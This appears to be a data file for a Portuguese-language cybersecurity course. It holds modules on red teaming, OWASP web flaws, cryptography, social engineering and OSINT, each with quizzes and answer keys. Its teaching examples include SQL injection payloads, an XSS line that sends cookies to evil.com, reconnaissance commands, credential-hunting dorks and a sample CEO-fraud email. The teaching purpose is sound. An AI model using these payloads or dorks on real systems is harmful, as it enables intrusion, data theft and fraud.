          {
            svgIcon: SVGI.users,
            term: "Social Engineering",
            def: "Phishing, vishing, pretexting. Testa o elo mais fraco: o humano.",
          },
        ],
      },
      {
        type: "code",
        language: "text",
        title: "Cyber Kill Chain — As 7 Etapas",
        description:
          "Cada etapa representa uma oportunidade de detecção e interrupção pelo Blue Team:",
        code: `CYBER KILL CHAIN (Lockheed Martin)

① RECONHECIMENTO
  Red:  OSINT, varredura de portas, enumeração de subdomínios
  Blue: Monitorar varreduras, honeypots, threat intel

② WEAPONIZAÇÃO
  Red:  Criar exploit + payload (ex: doc malicioso com macro)
  Blue: Controles preventivos, antivirus, sandboxing

③ ENTREGA
  Red:  Phishing, watering hole, USB, supply chain
  Blue: Email gateway, filtro web, treinamento de usuários

④ EXPLORAÇÃO
  Red:  Acionar o exploit no sistema-alvo
  Blue: EDR, patching, hardening de aplicações

⑤ INSTALAÇÃO
  Red:  Persistência — malware, backdoor, tarefa agendada
  Blue: Monitorar novos processos, integridade de arquivos

⑥ COMANDO & CONTROLE (C2)
  Red:  Canal de comunicação com o sistema comprometido
  Blue: DNS filtering, bloqueio de IPs maliciosos

⑦ AÇÕES NO OBJETIVO
  Red:  Exfiltração, ransomware, pivoting, destruição
  Blue: DLP, monitoramento de transferências, backups isolados`,
      },
      {
        type: "cards",
        title: "Ferramentas Fundamentais do Red Team",
        cards: [
          {
            svgIcon: SVGI.radar,
            term: "Nmap",
            def: "Scanner de rede. Descobre hosts ativos, portas abertas, serviços e versões. Base de qualquer reconhecimento.",
          },
          {
            svgIcon: SVGI.zap,
            term: "Metasploit",
            def: "Framework de exploração. Biblioteca de exploits prontos, geração de payloads, pós-exploração.",
          },
          {
            svgIcon: SVGI.globe,
            term: "Burp Suite",
            def: "Proxy para interceptar e manipular tráfego HTTP. Essencial para pentest de aplicações web.",
          },
          {
            svgIcon: SVGI.users,
            term: "Bloodhound",
            def: "Mapeia relações de confiança no Active Directory. Identifica caminhos de ataque para Domain Admin.",
          },
          {
            svgIcon: SVGI.terminal,
            term: "Cobalt Strike",
            def: "Framework de C2 (Comando e Controle). Usado por Red Teams avançados — e por APTs reais.",
          },
          {
            svgIcon: SVGI.code,
            term: "Impacket",
            def: "Biblioteca Python para interação com protocolos de rede Windows. Pass-the-Hash, Kerberoasting.",
          },
        ],
      },
      {
        type: "code",
        language: "bash",
        title: "Reconhecimento — Fluxo Básico",
        description:
          "Sequência típica de reconhecimento no início de um engajamento de pentest externo:",
        code: `# 1. Descoberta de subdomínios
subfinder -d alvo.com.br -o subdomains.txt
amass enum -d alvo.com.br >> subdomains.txt

# 2. Filtragem de ativos ativos
cat subdomains.txt | httpx -silent -o ativos_vivos.txt

# 3. Varredura de portas
nmap -iL ativos_vivos.txt -p- --open -T4 -oA nmap_full

# 4. Screenshots das interfaces web
gowitness file -f ativos_vivos.txt --delay 2

# 5. Enumeração de tecnologias
cat ativos_vivos.txt | whatweb --log-verbose=tech.txt

# 6. GitHub dork para credenciais expostas:
# site:github.com "alvo.com.br" password OR secret OR key`,
      },
      {
        type: "cards",
        title: "Técnicas de Pós-Exploração",
        cards: [
          {
            svgIcon: SVGI.key,
            term: "Credential Dumping",
            def: "Extração de hashes e credenciais da memória (LSASS) ou do SAM. Mimikatz é a ferramenta padrão em ambientes Windows.",
          },
          {
            svgIcon: SVGI.scroll,
            term: "Lateral Movement",
            def: "Mover-se pela rede após acesso inicial. Pass-the-Hash, Pass-the-Ticket, RDP, WMI, PsExec.",
          },
          {
            svgIcon: SVGI.lock,
            term: "Persistence",
            def: "Manter acesso mesmo após reboot: registro do Windows, cron jobs, backdoors em serviços, golden tickets Kerberos.",
          },
          {
            svgIcon: SVGI.cloud,
            term: "Data Exfiltration",
            def: "Extrair dados sem ser detectado. Tunneling via DNS, HTTPS para domínios C2, compressão + criptografia.",
          },
          {
            svgIcon: SVGI.globe,
            term: "Pivoting",
            def: "Usar sistema comprometido como trampolim para acessar segmentos de rede isolados. Proxychains, SSH tunnels.",
          },
          {
            svgIcon: SVGI.bug,
            term: "Covering Tracks",
            def: "Limpar logs para dificultar detecção forense. Wevtutil, log rotation, timestomping.",
          },
        ],
      },
    ],
    lokiQuestions: [
      {
        question: "Qual a diferença entre um pentester e um hacker malicioso?",
        options: [
          "O pentester usa técnicas mais avançadas",
          "O hacker malicioso tem mais conhecimento técnico",
          "A autorização e o objetivo — o pentester age com permissão e entrega um relatório",
          "O pentester trabalha apenas em ambientes de teste, nunca em produção",
        ],
        correct: 2,
        explanation:
          "A técnica pode ser idêntica. O que diferencia é a autorização explícita e o objetivo de melhorar a segurança.",
      },
      {
        question:
          "Na Cyber Kill Chain, em qual etapa o adversário estabelece persistência no sistema?",
        options: [
          "Exploração",
          "Instalação",
          "Comando & Controle",
          "Ações no Objetivo",
        ],
        correct: 1,
        explanation:
          "Instalação = o adversário coloca um backdoor, malware ou tarefa agendada para manter acesso.",
      },
      {
        question: "O que é um pentest Gray Box?",
        options: [
          "Pentest realizado em ambiente de nuvem",
          "Zero conhecimento prévio sobre o alvo",
          "Conhecimento parcial — simula insider ou atacante com algum acesso",
          "Pentest focado apenas em engenharia social",
        ],
        correct: 2,
        explanation:
          "Gray Box: entre Black (zero info) e White (info total). O mais comum em engajamentos reais.",
      },
      {
        question: 'O que é "Lateral Movement" em pós-exploração?',
        options: [
          "Apagar logs para cobrir rastros",
          "Extrair dados do sistema comprometido",
          "Mover-se para outros sistemas na rede após acesso inicial",
          "Escalar privilégios localmente",
        ],
        correct: 2,
        explanation:
          "Lateral movement = usar o acesso inicial como trampolim para comprometer outros sistemas na mesma rede.",
      },
    ],
  },

  /* ─────────────────────────────────────────────────────────
     MÓDULO 3 — SEGURANÇA WEB (OWASP)
  ───────────────────────────────────────────────────────── */
  {
    id: "web",
    title: "Segurança Web & OWASP",
    subtitle: "As vulnerabilidades que dominam a web",
    locked: true,
    unlockAfter: "red",
    svgIcon: SVGI.globe,
    estimatedMin: 16,
    sections: [
      {
        type: "text",
        title: "Por que Segurança Web é Crítica?",
        content: `A grande maioria dos ataques bem-sucedidos contra organizações passa por aplicações web. APIs expostas, formulários de login, sistemas de e-commerce, painéis administrativos — cada endpoint é uma superfície de ataque potencial. O OWASP (Open Web Application Security Project) publica a cada poucos anos o Top 10, uma lista das vulnerabilidades mais críticas e prevalentes em aplicações web.

Entender essas vulnerabilidades é obrigatório tanto para desenvolvedores quanto para profissionais de segurança. Um desenvolvedor que não conhece SQL Injection inevitavelmente cria código vulnerável. Um pentester que não entende o OWASP Top 10 não está fazendo seu trabalho.`,
      },
      {
        type: "cards",
        title: "OWASP Top 10 — 2021",
        cards: [
          {
            svgIcon: SVGI.database,
            term: "A01 — Broken Access Control",
            def: "Usuários acessam recursos além do permitido. É o #1 desde 2021. CWEs incluem bypass de autenticação e elevação de privilégio.",
          },
          {
            svgIcon: SVGI.lock,
            term: "A02 — Cryptographic Failures",
            def: "Dados sensíveis expostos por criptografia fraca ou ausente. Senhas em MD5, HTTP sem TLS, chaves hardcoded.",
          },
          {
            svgIcon: SVGI.database,
            term: "A03 — Injection",
            def: "SQL, NoSQL, OS, LDAP injection. Dados não confiáveis enviados a um interpretador. SQLi ainda é devastador em 2024.",
          },
          {
            svgIcon: SVGI.bug,
            term: "A04 — Insecure Design",
            def: "Falhas de design arquitetural, não apenas de implementação. Ausência de modelagem de ameaças no desenvolvimento.",
          },
          {
            svgIcon: SVGI.server,
            term: "A05 — Security Misconfiguration",
            def: "Configurações padrão inseguras, serviços desnecessários, mensagens de erro verbosas, cloud mal configurada.",
          },
          {
            svgIcon: SVGI.code,
            term: "A06 — Vulnerable Components",
            def: "Bibliotecas, frameworks e componentes desatualizados com vulnerabilidades conhecidas. Log4Shell é o exemplo máximo.",
          },
          {
            svgIcon: SVGI.key,
            term: "A07 — Auth Failures",
            def: "Falhas em autenticação e gerenciamento de sessão. Senhas fracas, sessões não expiradas, ausência de MFA.",
          },
          {
            svgIcon: SVGI.code,
            term: "A08 — Software Integrity",
            def: "Código e infraestrutura que não verificam integridade. Supply chain attacks, plugins maliciosos, CI/CD comprometido.",
          },
        ],
      },
      {
        type: "code",
        language: "sql",
        title: "SQL Injection — Ataque e Defesa",
        description:
          "O clássico de todos os clássicos — ainda presente em milhares de aplicações:",
        code: `/* ─── VULNERÁVEL ─── */
query = "SELECT * FROM users WHERE user='" + username + "'"
-- Se username = ' OR '1'='1
-- Query vira: SELECT * FROM users WHERE user='' OR '1'='1'
-- Retorna TODOS os usuários — bypass de autenticação

-- Pior caso: username = '; DROP TABLE users; --
-- Ou: ' UNION SELECT username, password FROM admin_users --

/* ─── SEGURO — Prepared Statements ─── */
-- Python / psycopg2:
cursor.execute(
    "SELECT * FROM users WHERE user = %s",
    (username,)  -- parâmetro separado, nunca interpolado
)

-- Java / JDBC:
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE user = ?"
);
ps.setString(1, username);

/* ─── DETECÇÃO ─── */
-- WAF rules, logs de erro SQL, anomalias em queries
-- Ferramenta: sqlmap -u "http://alvo.com/login" --forms`,
      },
      {
        type: "code",
        language: "javascript",
        title: "XSS — Cross-Site Scripting",
        description:
          "Injeção de scripts maliciosos que executam no navegador de outros usuários:",
        code: `// ─── REFLECTED XSS ───
// URL: https://site.com/search?q=<script>alert(1)</script>
// Se o server renderiza: <p>Resultado para: <script>alert(1)</script></p>
// → executa no navegador da vítima

// ─── STORED XSS (mais perigoso) ───
// Comentário em fórum: <script>fetch('https://evil.com/?c='+document.cookie)</script>
// Toda vez que alguém lê o comentário → cookie roubado

// ─── DOM XSS ───
// document.getElementById('output').innerHTML = location.hash.substring(1);
// URL: https://site.com/page#<img src=x onerror=alert(1)>

// ─── DEFESA ───
// 1. Escape de output (SEMPRE antes de inserir no DOM)
function escapeHTML(str) {
  return str.replace(/[&<>"']/g, m => ({
    '&':'&amp;', '<':'&lt;', '>':'&gt;',
    '"':'&quot;', "'":'&#39;'
  }[m]));
}
// 2. Content Security Policy (CSP header)
// Content-Security-Policy: default-src 'self'; script-src 'self'
// 3. HttpOnly cookies (inacessíveis via JavaScript)
// 4. Usar textContent em vez de innerHTML`,
      },
      {
        type: "cards",
        title: "Outras Vulnerabilidades Web Críticas",
        cards: [
          {
            svgIcon: SVGI.scroll,
            term: "CSRF",
            def: "Cross-Site Request Forgery. Força o navegador autenticado da vítima a fazer requisições não autorizadas. Defesa: CSRF tokens.",
          },
          {
            svgIcon: SVGI.server,
            term: "SSRF",
            def: "Server-Side Request Forgery. Faz o servidor fazer requisições para recursos internos. Acesso a metadados de cloud (AWS IMDSv1).",
          },
          {
            svgIcon: SVGI.code,
            term: "XXE",
            def: "XML External Entity. Parsers XML mal configurados processam entidades externas, expondo arquivos internos do servidor.",
          },
          {
            svgIcon: SVGI.layers,
            term: "IDOR",
            def: "Insecure Direct Object Reference. Manipulação de IDs em URLs/parâmetros para acessar recursos de outros usuários.",
          },
          {
            svgIcon: SVGI.terminal,
            term: "Path Traversal",
            def: "Acesso a arquivos fora do diretório permitido via ../../../etc/passwd. Falha de validação de input.",
          },
          {
            svgIcon: SVGI.zap,
            term: "RCE",
            def: "Remote Code Execution. O grau máximo de comprometimento — execução de código arbitrário no servidor.",
          },
        ],
      },
      {
        type: "code",
        language: "text",
        title: "Headers de Segurança HTTP",
        description:
          "Configurações no servidor que reduzem drasticamente a superfície de ataque web:",
        code: `# Headers essenciais para produção

# Impede clickjacking
X-Frame-Options: DENY
# ou: Content-Security-Policy: frame-ancestors 'none'

# Controle de tipos MIME
X-Content-Type-Options: nosniff

# Força HTTPS por 1 ano (incluindo subdomínios)
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# Controla informações no Referer
Referrer-Policy: strict-origin-when-cross-origin

# Desativa features do navegador não usadas
Permissions-Policy: geolocation=(), microphone=(), camera=()

# CSP robusto (adaptar ao projeto)
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self';
  frame-ancestors 'none';
  base-uri 'self';

# Verificar: securityheaders.com`,
      },
    ],
    lokiQuestions: [
      {
        question: "Qual é a vulnerabilidade #1 no OWASP Top 10 de 2021?",
        options: [
          "SQL Injection",
          "Broken Access Control",
          "Cryptographic Failures",
          "XSS",
        ],
        correct: 1,
        explanation:
          "Broken Access Control subiu para #1 em 2021 — usuários acessando recursos além do que deveriam.",
      },
      {
        question: "Como Prepared Statements protegem contra SQL Injection?",
        options: [
          "Criptografam as queries antes de enviar ao banco",
          "Separam o código SQL dos dados do usuário, impedindo que input seja interpretado como código",
          "Limitam o tamanho do input do usuário",
          "Bloqueiam caracteres especiais automaticamente",
        ],
        correct: 1,
        explanation:
          "Prepared Statements: a query é compilada separadamente dos parâmetros. O input nunca é interpretado como SQL.",
      },
      {
        question: "O que é SSRF (Server-Side Request Forgery)?",
        options: [
          "Injeção de scripts no navegador do usuário",
          "Falsificação de requisições entre sites diferentes",
          "Forçar o servidor a fazer requisições para recursos internos não expostos",
          "Manipulação de sessões HTTP",
        ],
        correct: 2,
        explanation:
          "SSRF: o atacante faz o servidor fazer requisições internas — perigoso em cloud (acesso ao metadata endpoint da AWS).",
      },
      {
        question: 'O que o header HTTP "X-Frame-Options: DENY" previne?',
        options: [
          "SQL Injection via formulários",
          "Clickjacking — a página não pode ser embarcada em iframes",
          "XSS via iframes externos",
          "CSRF em requisições cross-origin",
        ],
        correct: 1,
        explanation:
          "X-Frame-Options: DENY impede que a página seja carregada em um iframe — principal defesa contra clickjacking.",
      },
    ],
  },

  /* ─────────────────────────────────────────────────────────
     MÓDULO 4 — CRIPTOGRAFIA
  ───────────────────────────────────────────────────────── */
  {
    id: "crypto",
    title: "Criptografia",
    subtitle: "A matemática que protege tudo",
    locked: true,
    unlockAfter: "web",
    svgIcon: SVGI.key,
    estimatedMin: 14,
    sections: [
      {
        type: "text",
        title: "Por que Criptografia Importa",
        content: `Criptografia é o pilar técnico que garante confidencialidade, integridade e autenticidade na era digital. Quando você acessa um site com HTTPS, envia uma mensagem no WhatsApp ou usa um cartão de crédito, criptografia está protegendo suas informações — geralmente de forma transparente.

Para profissionais de segurança, entender criptografia não é opcional. Você precisa saber quando ela está sendo usada corretamente (HTTPS com TLS 1.3), quando está sendo mal implementada (SSL 3.0, RC4, MD5 para senhas), e quando está sendo completamente contornada por um adversário.

Criptografia forte implementada incorretamente é tão perigosa quanto nenhuma criptografia.`,
      },
      {
        type: "cards",
        title: "Tipos de Criptografia",
        cards: [
          {
            svgIcon: SVGI.key,
            term: "Simétrica",
            def: "Mesma chave para cifrar e decifrar. Rápida, eficiente. Problema: como compartilhar a chave? (AES-256, ChaCha20)",
          },
          {
            svgIcon: SVGI.unlock,
            term: "Assimétrica",
            def: "Par de chaves: pública (cifra) e privada (decifra). Resolve o problema de troca de chaves. (RSA-4096, ECC/Ed25519)",
          },
          {
            svgIcon: SVGI.hash,
            term: "Hash",
            def: "Função unidirecional: transforma dados em digest de tamanho fixo. Sem reversão. (SHA-256, bcrypt, argon2id)",
          },
          {
            svgIcon: SVGI.shield,
            term: "Certificados X.509",
            def: "Vinculam chave pública a uma identidade verificada por uma CA. Base do HTTPS — o cadeado no navegador.",
          },
        ],
      },
      {
        type: "code",
        language: "python",
        title: "Criptografia na Prática — Python",
        description:
          "Operações criptográficas comuns com a biblioteca cryptography:",
        code: `from cryptography.fernet import Fernet
import hashlib, bcrypt

# ─── 1. Criptografia Simétrica (AES via Fernet) ───
chave = Fernet.generate_key()
f = Fernet(chave)
cifrado = f.encrypt(b"dados confidenciais")
original = f.decrypt(cifrado)
# Fernet = AES-128-CBC + HMAC-SHA256

# ─── 2. Hash para Senhas (bcrypt — CORRETO) ───
senha = b"minhasenha123"
hash_senha = bcrypt.hashpw(senha, bcrypt.gensalt(rounds=12))
# Verificação:
bcrypt.checkpw(senha, hash_senha)  # True

# NUNCA use MD5, SHA-1, SHA-256 puro para senhas!
# Use: bcrypt, scrypt, argon2id

# ─── 3. Hash para Integridade (SHA-256) ───
arquivo = b"conteúdo do arquivo"
digest = hashlib.sha256(arquivo).hexdigest()
# Qualquer alteração no arquivo muda completamente o hash`,
      },
      {
        type: "text",
        title: "TLS — A Criptografia da Web",
        content: `TLS (Transport Layer Security) é o protocolo que protege a comunicação na web. O "S" no HTTPS significa que a conexão está protegida por TLS. Versões antigas (SSL, TLS 1.0, TLS 1.1) têm vulnerabilidades conhecidas e não devem mais ser usadas.

Perfect Forward Secrecy (PFS) garante que se a chave privada do servidor for comprometida no futuro, sessões passadas não podem ser decifradas — porque cada sessão usa chaves efêmeras únicas. TLS 1.3 força PFS por padrão e remove algoritmos legados.

Certificate Transparency (CT) é um mecanismo de auditoria pública onde todas as CAs devem registrar certificados emitidos em logs públicos — permite detectar certificados fraudulentos emitidos para seu domínio.`,
      },
      {
        type: "cards",
        title: "Vulnerabilidades Criptográficas Clássicas",
        cards: [
          {
            svgIcon: SVGI.alertTri,
            term: "Heartbleed",
            def: "Bug no OpenSSL: lia 64KB da memória do servidor por requisição, expondo chaves privadas e senhas.",
          },
          {
            svgIcon: SVGI.alertTri,
            term: "BEAST / POODLE",
            def: "Ataques contra SSL 3.0 e TLS 1.0. Demonstraram que protocolos legados não podem ser considerados seguros.",
          },
          {
            svgIcon: SVGI.alertTri,
            term: "MD5 Collisions",
            def: "MD5 pode ser forjado. Em 2008, pesquisadores criaram um certificado CA falso explorando colisões MD5.",
          },
          {
            svgIcon: SVGI.alertTri,
            term: "ECB Mode",
            def: 'Modo do AES onde blocos iguais produzem ciphertext igual. Vaza padrões dos dados — o "pinguim" ECB.',
          },
          {
            svgIcon: SVGI.alertTri,
            term: "Downgrade Attack",
            def: "Forçar negociação para algoritmos mais fracos. FREAK, Logjam atacavam suporte legado deixado por compatibilidade.",
          },
          {
            svgIcon: SVGI.alertTri,
            term: "Weak RNG",
            def: "Gerador de números aleatórios fraco quebra toda a criptografia. Debian 2008: chaves RSA previsíveis.",
          },
        ],
      },
      {
        type: "code",
        language: "text",
        title: "Checklist de Criptografia Segura",
        description: "O que usar e o que evitar em implementações modernas:",
        code: `CRIPTOGRAFIA — USE vs EVITE

ALGORITMOS SIMÉTRICOS
  ✓ USE:   AES-256-GCM, ChaCha20-Poly1305
  ✗ EVITE: DES, 3DES, RC4, AES-ECB

ALGORITMOS ASSIMÉTRICOS  
  ✓ USE:   RSA-4096, ECDSA (P-256/P-384), Ed25519
  ✗ EVITE: RSA < 2048 bits

HASH
  ✓ USE:   SHA-256, SHA-3 (integridade)
           bcrypt/scrypt/argon2id (senhas)
  ✗ EVITE: MD5, SHA-1

PROTOCOLOS
  ✓ USE:   TLS 1.2 (com PFS), TLS 1.3
  ✗ EVITE: SSL v2/v3, TLS 1.0, TLS 1.1

REGRA DE OURO: nunca implemente criptografia do zero.
Use bibliotecas auditadas: libsodium, cryptography.py, WebCrypto API`,
      },
    ],
    lokiQuestions: [
      {
        question:
          "Por que bcrypt é preferível a SHA-256 para armazenar senhas?",
        options: [
          "bcrypt é mais seguro matematicamente que SHA-256",
          "SHA-256 não funciona com caracteres especiais em senhas",
          "bcrypt é intencionalmente lento, dificultando brute force; SHA-256 é ultrarrápido em GPU",
          "bcrypt criptografa; SHA-256 apenas comprime",
        ],
        correct: 2,
        explanation:
          "Senhas precisam de funções lentas (work factor). SHA-256 é rápido demais — GPUs testam bilhões por segundo.",
      },
      {
        question: "O que é Perfect Forward Secrecy (PFS)?",
        options: [
          "Criptografia que não pode ser quebrada por nenhum computador",
          "Garantia de que comprometer a chave privada atual não expõe sessões passadas",
          "Um protocolo de autenticação de dois fatores",
          "Um algoritmo de hash sem colisões conhecidas",
        ],
        correct: 1,
        explanation:
          "PFS usa chaves efêmeras por sessão. Comprometer a chave privada do servidor não expõe sessões antigas.",
      },
      {
        question:
          "Qual a diferença fundamental entre criptografia simétrica e assimétrica?",
        options: [
          "Simétrica é mais segura; assimétrica é mais rápida",
          "Simétrica usa a mesma chave para cifrar/decifrar; assimétrica usa par de chaves pública/privada",
          "Assimétrica é para dados em repouso; simétrica é para dados em trânsito",
          "Simétrica é para texto; assimétrica é para arquivos binários",
        ],
        correct: 1,
        explanation:
          "Simétrica = uma chave (rápida, problema de distribuição). Assimétrica = par de chaves (resolve distribuição, mais lenta).",
      },
    ],
  },

  /* ─────────────────────────────────────────────────────────
     MÓDULO 5 — ENGENHARIA SOCIAL
  ───────────────────────────────────────────────────────── */
  {
    id: "social",
    title: "Engenharia Social",
    subtitle: "O ataque ao sistema humano",
    locked: true,
    unlockAfter: "crypto",
    svgIcon: SVGI.users,
    estimatedMin: 13,
    sections: [
      {
        type: "text",
        title: "O Elo Mais Fraco",
        content: `Você pode ter o firewall mais sofisticado do mercado, EDR de última geração, SIEM com regras precisas — e um adversário bypassa tudo isso com um e-mail bem redigido. Engenharia social explora algo que nenhuma tecnologia pode corrigir completamente: o comportamento humano.

Seres humanos são evolutivamente programados para confiar, ajudar, responder à urgência e obedecer a autoridade. Engenharia social não "hackeia" sistemas — hackeia esses padrões cognitivos. E funciona independente do nível técnico do alvo: CEOs, administradores de sistema e especialistas em segurança já foram comprometidos.`,
      },
      {
        type: "cards",
        title: "Vetores de Engenharia Social",
        cards: [
          {
            svgIcon: SVGI.mail,
            term: "Phishing",
            def: "E-mail fraudulento que imita uma fonte confiável. Objetivo: credenciais, instalação de malware, transferência financeira.",
          },
          {
            svgIcon: SVGI.target,
            term: "Spear Phishing",
            def: "Phishing altamente direcionado para uma pessoa específica, usando informações pessoais para parecer legítimo.",
          },
          {
            svgIcon: SVGI.users,
            term: "Whaling",
            def: "Spear phishing contra executivos de alto nível (C-suite). Alta personalização, alto impacto potencial.",
          },
          {
            svgIcon: SVGI.phone,
            term: "Vishing",
            def: "Engenharia social por voz/telefone. Simula suporte técnico, banco, IRS. Exploita urgência e autoridade.",
          },
          {
            svgIcon: SVGI.mail,
            term: "Smishing",
            def: "Phishing via SMS. Links maliciosos com pretextos de entrega de pacote, banco, promoções.",
          },
          {
            svgIcon: SVGI.eye,
            term: "Pretexting",
            def: 'Criar uma narrativa falsa (pretexto) para obter informações. Ex: "Sou da TI, preciso verificar sua conta."',
          },
        ],
      },
      {
        type: "cards",
        title: "Princípios de Cialdini — Armas da Persuasão",
        cards: [
          {
            svgIcon: SVGI.shield,
            term: "Autoridade",
            def: '"Sou o CEO / agente federal." Tendência humana de obedecer figuras de autoridade sem questionar.',
          },
          {
            svgIcon: SVGI.zap,
            term: "Urgência / Escassez",
            def: '"Sua conta será bloqueada em 2 horas." Urgência desativa o pensamento crítico e acelera ação impulsiva.',
          },
          {
            svgIcon: SVGI.users,
            term: "Reciprocidade",
            def: '"Te ajudei antes, agora preciso de um favor." Sentimento de dívida explora a norma social de retribuição.',
          },
          {
            svgIcon: SVGI.target,
            term: "Simpatia / Rapport",
            def: "Construir conexão antes do pedido malicioso. Pessoas ajudam quem gostam — e confiam mais facilmente.",
          },
          {
            svgIcon: SVGI.globe,
            term: "Prova Social",
            def: '"Todos da sua equipe já atualizaram." Comportamento de grupo como validação — se todos fizeram, deve ser seguro.',
          },
          {
            svgIcon: SVGI.lock,
            term: "Compromisso",
            def: 'Pequenas concessões iniciais criam comprometimento. Após dizer "sim" várias vezes, é difícil recusar o pedido real.',
          },
        ],
      },
      {
        type: "code",
        language: "text",
        title: "BEC — Business Email Compromise",
        description:
          "O ataque de engenharia social mais financeiramente devastador do mundo:",
        code: `BEC (Business Email Compromise)
PREJUÍZO GLOBAL (2023): US$ 2,9 bilhões — FBI IC3 Report
Sem exploits. Sem malware. Pura engenharia social.

─── CENÁRIO: "CEO Fraud" ───

[OSINT]
  → CFO identificada: Maria Oliveira (LinkedIn)
  → CEO identificado: Carlos Mendes (site corporativo)

[O Ataque]
  De: carlos.mendes@empresa-corp.com.br  ← domínio similar
  Para: maria.oliveira@empresa.com.br

  "Maria, precisamos adiantar o pagamento de R$ 840.000 hoje
  para garantir o desconto negociado. Use a nova conta bancária
  que o fornecedor enviou esta manhã. Confidencial — não
  mencione para o time jurídico ainda. Conto com você."

[POR QUE FUNCIONA]
  ✓ Autoridade máxima (CEO)
  ✓ Urgência + consequência financeira
  ✓ Instrução para contornar controles

[DEFESA]
  → Verificar POR TELEFONE transferências acima de X valor
  → Processo de aprovação fora do email para valores altos
  → Treinamento específico para equipe financeira`,
      },
      {
        type: "text",
        title: "Defesa contra Engenharia Social",
        content: `Tecnologia ajuda mas não resolve. MFA (autenticação multifator) é a defesa técnica mais eficaz contra phishing de credenciais — mesmo que o usuário entregue a senha, o atacante não consegue o segundo fator. Mas o MFA não protege contra phishing de malware ou transferências financeiras fraudulentas.

A defesa mais sustentável é cultural: organizações onde qualquer funcionário se sente seguro para questionar uma solicitação suspeita — mesmo que venha de um "superior" — são inerentemente mais resistentes. Isso requer treinamento regular com simulações reais de phishing, não apenas slides sobre "como identificar e-mails suspeitos".

A pergunta que cada funcionário deve internalizar: "Se eu estiver errado sobre essa solicitação ser legítima, qual é o pior que pode acontecer?"`,
      },
    ],
    lokiQuestions: [
      {
        question:
          'Qual princípio de Cialdini é explorado quando um e-mail diz "sua conta será bloqueada em 2 horas"?',
        options: [
          "Reciprocidade",
          "Simpatia",
          "Urgência / Escassez",
          "Autoridade",
        ],
        correct: 2,
        explanation:
          "Urgência artificial desativa pensamento crítico — a vítima age antes de pensar se a solicitação é legítima.",
      },
      {
        question: "Por que o MFA é eficaz contra phishing de credenciais?",
        options: [
          "Impede que o e-mail de phishing chegue à caixa de entrada",
          "Mesmo que a senha seja roubada, o atacante não consegue o segundo fator",
          "Detecta automaticamente sites de phishing",
          "Criptografa as credenciais para que não possam ser usadas",
        ],
        correct: 1,
        explanation:
          "MFA = mesmo com a senha, o atacante precisa do segundo fator que só o usuário legítimo possui.",
      },
      {
        question: "O que é BEC (Business Email Compromise)?",
        options: [
          "Um tipo de malware que compromete servidores de email corporativo",
          "Ataque que usa engenharia social para induzir transferências financeiras fraudulentas, sem exploits técnicos",
          "Uma técnica de phishing que usa certificados SSL falsos",
          "Um ataque DDoS contra servidores de email",
        ],
        correct: 1,
        explanation:
          "BEC: o ataque mais financeiramente devastador. Pura engenharia social, sem malware. US$2,9 bilhões em 2023.",
      },
    ],
  },

  /* ─────────────────────────────────────────────────────────
     MÓDULO 6 — OSINT
  ───────────────────────────────────────────────────────── */
  {
    id: "osint",
    title: "OSINT",
    subtitle: "Inteligência de Fontes Abertas",
    locked: true,
    unlockAfter: "social",
    svgIcon: SVGI.search,
    estimatedMin: 12,
    sections: [
      {
        type: "text",
        title: "O que é OSINT?",
        content: `OSINT (Open Source Intelligence) é a coleta e análise de informações disponíveis publicamente para produzir inteligência acionável. "Fontes abertas" significa qualquer informação acessível sem meios ilegais: internet pública, registros governamentais, redes sociais, documentos corporativos, bancos de dados de vulnerabilidades.

Tanto atacantes quanto defensores usam OSINT. Um adversário usa para mapear um alvo antes de qualquer ação técnica. Um investigador usa para atribuir um ataque a um grupo específico. Um analista de threat intel usa para identificar infraestrutura de campanhas maliciosas em andamento.`,
      },
      {
        type: "cards",
        title: "Fontes e Técnicas de OSINT",
        cards: [
          {
            svgIcon: SVGI.server,
            term: "Shodan / Censys",
            def: "Motores de busca para dispositivos conectados à internet. Encontra servidores, câmeras, ICS/SCADA expostos globalmente.",
          },
          {
            svgIcon: SVGI.search,
            term: "Google Dorks",
            def: "Operadores avançados do Google para encontrar informações sensíveis indexadas acidentalmente (site:, filetype:, inurl:).",
          },
          {
            svgIcon: SVGI.globe,
            term: "WHOIS / DNS",
            def: "Dados de registro de domínios, histórico de DNS, registros MX/SPF — revelam infraestrutura e relações entre ativos.",
          },
          {
            svgIcon: SVGI.scroll,
            term: "Wayback Machine",
            def: "Histórico de páginas web. Pode revelar informações removidas, versões antigas de código, credenciais expostas no passado.",
          },
          {
            svgIcon: SVGI.users,
            term: "LinkedIn / Redes Sociais",
            def: "Mapeamento de funcionários, tecnologias usadas, estrutura organizacional — base para ataques de engenharia social.",
          },
          {
            svgIcon: SVGI.code,
            term: "GitHub Dorks",
            def: "Busca por credenciais, tokens, chaves API e segredos acidentalmente commitados em repositórios públicos.",
          },
        ],
      },
      {
        type: "code",
        language: "text",
        title: "Google Dorks — Exemplos Práticos",
        description:
          "Operadores para encontrar informações sensíveis em fontes públicas (use apenas com autorização):",
        code: `# Arquivos de configuração expostos
site:alvo.com filetype:env OR filetype:cfg OR filetype:ini

# Painéis de administração expostos
site:alvo.com inurl:admin OR inurl:login OR inurl:dashboard

# Documentos internos indexados
site:alvo.com filetype:pdf OR filetype:xlsx OR filetype:docx

# Câmeras expostas
intitle:"webcamXP 5" OR intitle:"IP Camera" inurl:8080

# Erros de banco de dados (revela stack tecnológico)
site:alvo.com "mysql_fetch_array" OR "ORA-01756"

# Subdomínios não listados
site:*.alvo.com -www

# GitHub: credenciais expostas
site:github.com "alvo.com" password OR secret OR api_key`,
      },
      {
        type: "cards",
        title: "Ferramentas OSINT Essenciais",
        cards: [
          {
            svgIcon: SVGI.layers,
            term: "Maltego",
            def: "Plataforma visual de mapeamento de relações. Conecta domínios, IPs, pessoas, organizações.",
          },
          {
            svgIcon: SVGI.mail,
            term: "theHarvester",
            def: "Coleta emails, subdomínios, hosts de fontes públicas. Ferramenta padrão no Kali Linux.",
          },
          {
            svgIcon: SVGI.globe,
            term: "Recon-ng",
            def: "Framework modular de OSINT. Dezenas de módulos para coleta automatizada de diversas fontes.",
          },
          {
            svgIcon: SVGI.code,
            term: "ExifTool",
            def: "Extrai metadados de imagens e documentos. Fotos podem revelar coordenadas GPS e câmera usada.",
          },
          {
            svgIcon: SVGI.radar,
            term: "SpiderFoot",
